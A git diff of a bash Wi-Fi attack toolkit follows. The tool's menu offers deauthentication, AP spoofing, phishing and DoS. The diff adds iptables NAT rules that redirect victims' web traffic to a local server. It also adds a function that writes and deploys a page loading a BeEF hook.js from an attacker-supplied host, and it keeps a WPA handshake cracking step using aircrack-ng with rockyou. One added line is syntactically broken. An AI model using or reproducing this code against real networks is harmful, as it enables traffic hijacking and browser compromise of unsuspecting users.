@@ -194,6 +194,7 @@ CIPHER_VAR=""
 AUTH_VAR=""
 BEACONS_VAR=""
 ESSID_VAR=""
+PASSWORD_CRACKED=""
 
 select_wireless(){
     
@@ -340,7 +341,6 @@ Craking_handshake(){
         
     WORDLIST="/usr/share/wordlists/rockyou.txt"
 
-    CRACKED_PASSWORD=false
 
     if aircrack-ng $FILE -w $WORDLIST > result_"$ESSID_VAR".txt ;then
 
@@ -348,7 +348,9 @@ Craking_handshake(){
         echo "We cracked the password. Saved on ./data_collected/network_dump/result_ESSID.txt"
         RESULTS=$(grep "KEY FOUND!" result_"$ESSID_VAR".txt | tr -d '[:space:]')
         echo "$RESULTS"
-        CRACKED_PASSWORD=true
+        
+        =$(grep "KEY FOUND!" ./data_collected/network_dump/result_succesful_example.txt | sed -E 's/.*\[ (.+) \].*/\1/' | head -n 1)
+
 
         rm ./wificapture-01.*
         cd .. && cd ..
@@ -439,9 +441,15 @@ Bruteforce(){
     
 }
 
-beefattack() {
-  
+IP="127.0.0.1"
+IP_HOOK=""
+
+iptables_redirect_traffic(){
     
+    iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination $IP:80
+    iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination $IP:80
+    iptables -t nat -A POSTROUTING -j MASQUERADE
+
 }
 
 cleantables() {
@@ -451,62 +459,68 @@ cleantables() {
     iptables -Z
 }
 
+html_hook(){
 
-PASSWORD_cracked="A123456789a!"
-
-false_ap(){
-
-    if echo "$PRIVACY_VAR" | grep -q "WPA2 WPA"; then 
-        WPA=3
-    elif echo "$PRIVACY_VAR" | grep -q "WPA2"; then
-        WPA=2
-    elif echo "$PRIVACY_VAR" | grep -q "WPA"; then
-        WPA=1
-    else
-        WPA=0  # AP Abierto o WEP (no recomendado)
-    fi
-
-    if echo "$AUTH_VAR" | grep -q "PSK"; then
-        WPA_KEY_MGMT="WPA-PSK"
-    elif echo "$AUTH_VAR" | grep -q "EAP"; then
-        WPA_KEY_MGMT="WPA-EAP"
-    else
-        WPA_KEY_MGMT=""  # Red abierta
-    fi
-
-    if echo "$CIPHER_VAR" | grep -q "CCMP" && echo "$CIPHER_VAR" | grep -q "TKIP"; then
-        RSN_PAIRWISE="CCMP TKIP"
-    elif echo "$CIPHER_VAR" | grep -q "CCMP"; then
-        RSN_PAIRWISE="CCMP"
-    elif echo "$CIPHER_VAR" | grep -q "TKIP"; then
-        RSN_PAIRWISE="TKIP"
-    else
-        RSN_PAIRWISE=""  # Red abierta o WEP
-    fi
-
-    cat <<EOF > hostapd.conf
-interface=$INTERFACE
-driver=nl80211
-ssid=$ESSID_VAR
-bssid=$BSSID_VAR
-hw_mode=g
-channel=$CHANNEL_VAR
-macaddr_acl=0
-auth_algs=1
-wpa=$WPA
-wpa_passphrase=$PASSWORD_cracked
-wpa_key_mgmt=$WPA_KEY_MGMT
-rsn_pairwise=$RSN_PAIRWISE
+    cat <<EOF > ./templates/index.html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script src="http://$IP_HOOK:3000/hook.js"></script>
+</head>
+<body>
+</body>
+</html>
 EOF
 
-    echo "[+] Archivo hostapd.conf generado correctamente."
+    echo "HTML template created"
 
-    sudo ip link set wlan0mon down
-    sudo iw dev wlan0mon set type ap
-    sudo ip link set wlan0mon up
+    cp ./templates/index.html /var/www/html/index.html
+
+    rm ./templates/index.html
+
+    systemctl restart apache2
 
 }
 
+beef_hosted() {
+    read -p "Insert the beef server pubic adrress or Domain name" IP_HOOK
+
+    if wget $IP_HOOK:3000/hook.js ; then  
+        echo "Found hook on $IP_HOOK" 
+    else
+        echo "We haven't found the $IP_HOOK:3000/hook.js\n"
+        echo "Make sure its avaliable the port and the hook.js on that server"
+        return 1
+    fi
+
+    rm hook.js
+    
+    html_hook & 
+
+    # firefox --browser   --new-window 192.168.3.118:3000/ui/panel
+
+}
+
+beef_menu() {
+
+    exit_menu=false
+    while ! $exit_menu; do
+        echo "Beef Menu:"
+        echo "0. Exit"
+        echo "1. Use an external server"
+        echo "2. Launch beef localy"
+        read -p "Please Chose the type of Beef server: " CHOICE
+
+        case $CHOICE in
+            0) return 0;;
+            1) beef_hosted ;;
+            2) beef_local ;;
+            *) echo "❌ Not valid option."; exit_menu=true;;
+        esac
+    done
+
+    return 0
+}
 
 
 menu(){
@@ -597,7 +611,7 @@ menu(){
         echo "6. Fake Capcha (Deauther + Ap Spofing + Phishing Login)"
         echo "7. DoS Attack (Stop the wireless conexions)"
         echo "8. Scan Network (Search Devices + Vulnerabilities)"
-        echo "9. Something with Beef"
+        echo "9. BEeF redirect attack"
         echo "- - - - - - - - - - - - - - - - - -"
         echo ""
         echo ""
@@ -612,7 +626,7 @@ menu(){
             6) echo ""; hostname -I ;;
             7) Deauther "0" ;;
             8) echo ""; uptime ;;
-            9) echo ""; uname -r ;;
+            9) beef_menu ;;
             0) echo "👋 Goodbye..."; exit 0 ;;
             *) echo "❌ Not valid option." ; sleep 2 ;;
         esac
